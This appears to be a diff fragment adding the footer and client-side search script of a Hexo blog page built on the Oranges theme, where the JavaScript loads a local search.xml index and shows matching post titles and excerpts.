+        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
